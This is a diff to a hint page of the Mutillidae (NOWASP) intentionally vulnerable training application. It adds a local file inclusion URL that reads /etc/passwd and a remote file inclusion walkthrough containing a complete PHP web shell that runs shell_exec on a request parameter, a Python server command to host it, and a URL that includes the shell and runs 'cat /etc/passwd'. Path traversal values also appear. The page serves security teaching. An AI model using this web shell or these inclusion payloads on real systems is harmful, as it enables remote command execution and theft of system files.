@@ -30,11 +30,13 @@
 			in order to gain access or load content to which the user is not
 			authorized. 
 			<br/><br/>
-			<span class="report-header">Example: Local and Remote File Inclusion</span>
+			<span class="report-header">Example: Local File Inclusion</span>
 			<br/><br/>
 			Note the page parameter in NOWASP URLs. This parameter is the include
 			file to load within the main frame. Since this parameter loads any
 			file passed, attempt to pass a local file or remote file URI.
+			<br/><br/>
+		    http://[PATH TO MUTILLIDAE]/index.php?page=/etc/passwd
 			<br/><br/>
 			<span class="report-header">Example: Accessing system files</span>
 			<br/><br/>
@@ -56,6 +58,25 @@
 			Tool: Tamper Data, Paros, WebScarab, Burp<br/>
 			Field: phpfile<br/>
 			Value: &lt;system file path&gt;, ../../../boot.ini, ..\..\..\WINDOW\System32\drivers\etc\hosts, ../../../etc/passwd
+			<br/><br/>
+			<span class="report-header">Example: Remote File Inclusion - Web Shell</span>
+			<br/><br/>
+			Save this web shell in a file.
+			<br/><br/>
+			&lt;?php
+            	echo &quot;&lt;pre&gt;&quot;;
+            	echo &quot;shell_exec &quot;.$_REQUEST[&quot;pCommand&quot;].&quot;\n\n&quot;;
+            	echo shell_exec($_REQUEST[&quot;pCommand&quot;]);
+            	echo &quot;&lt;/pre&gt;&quot;;	
+            ?&gt;
+			<br/><br/>            
+            The web shell can be served using python's built-in web server. Python SimpleHTTPServer serves any content in the current directory on the port specified
+			<br/><br/>
+            python -m SimpleHTTPServer 8888
+            <br/><br/>
+            Browse to the web shell passing in the command as parameter pCommand
+			<br/><br/>            
+            http://[PATH TO MUTILLIDAE]/index.php?page=http://127.0.0.1:8888/simple-web-shell.php&pCommand=cat+/etc/passwd
 			<br/><br/>
 			<span id="videos" class="report-header">Videos</span>
 			<br/><br/>
